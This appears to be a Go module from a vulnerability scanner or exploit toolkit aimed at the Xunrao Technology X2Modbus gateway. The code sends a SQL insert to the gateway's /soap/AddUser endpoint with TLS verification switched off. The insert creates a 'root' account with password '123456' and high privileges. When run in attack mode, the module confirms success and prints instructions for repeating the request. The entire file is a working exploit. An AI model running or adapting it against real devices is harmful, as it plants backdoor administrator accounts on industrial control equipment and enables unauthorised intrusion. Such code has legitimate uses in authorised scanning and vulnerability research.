package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func XunRaoKeJiX2_AddUser(url string, Attack bool) error {
	payload := `insert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME) values('root','123456','4','2024-5-6','11:7:56')`

	payload = strings.ReplaceAll(payload, "\\r", "\\r\\n")
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/soap/AddUser", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "text/xml; charset=utf-8")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "AdduserResponse") {
		fmt.Println("[*]迅饶科技X2Modbus网关任意用户添加漏洞 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/soap/AddUse，并传入请求体`insert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME) values('root','123456','4','2024-5-6','11:7:56')`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
